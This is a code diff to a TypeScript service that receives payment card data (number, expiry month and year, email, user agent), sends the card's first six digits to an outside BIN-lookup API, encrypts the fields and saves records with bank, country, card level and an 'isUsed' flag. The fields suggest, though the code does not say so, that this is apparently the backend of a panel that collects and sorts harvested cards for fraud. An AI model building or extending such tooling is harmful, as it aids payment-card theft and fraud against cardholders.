@@ -41,11 +41,30 @@ export class InformationService {
         }
     }
     
-    async uploadInformation(ccDTO: ccDTO) {
+    async uploadInformation(ccDTO) {
         const bin = ccDTO.ccnum.slice(0, 6);
-        const response = await fetch(`https://api.shuniji.io/api/bincheck?bin=${bin}`);
+        
+        // Set up the payload for the POST request
+        const payload = JSON.stringify({
+            bin: bin,
+            ip: "8.8.8.8"
+        });
+    
+        // Set up the headers for the request
+        const headers = {
+            'Content-Type': 'application/json'
+        };
+    
+        // Perform the POST request
+        const response = await fetch('https://tele.shuniji.io/api/bin', {
+            method: 'POST',
+            headers: headers,
+            body: payload
+        });
+    
         const data = await response.json();
-
+    
+        // Encrypt the sensitive fields
         ccDTO.ccnum = this.encrypt(ccDTO.ccnum);
         ccDTO.month = this.encrypt(ccDTO.month);
         ccDTO.year = this.encrypt(ccDTO.year);
@@ -57,17 +76,20 @@ export class InformationService {
         ccDTO.userAgent = this.encrypt(ccDTO.userAgent);
         ccDTO.email = this.encrypt(ccDTO.email);
         
+        // Create and save the cc object
         const cc = new this.ccModel(ccDTO);
         cc.createDate = new Date(Date.now());
         cc.note = '';
         cc.isUsed = false;
         cc.bin = bin;
-        cc.total_bin = data.total_bins;
-        cc.country = data.bins_data[0].Country;
-        cc.bank = data.bins_data[0].Bank;
-        cc.level = data.bins_data[0].Level;
+        cc.total_bin = '';
+        cc.country = data.BIN.country.name + ' ' + data.BIN.country.flag
+        cc.bank = data.BIN.issuer.name;
+        cc.level = data.BIN.level;
+        
         return cc.save();
     }
+    
 
     async getInformation() {
         const data = await this.ccModel.find();
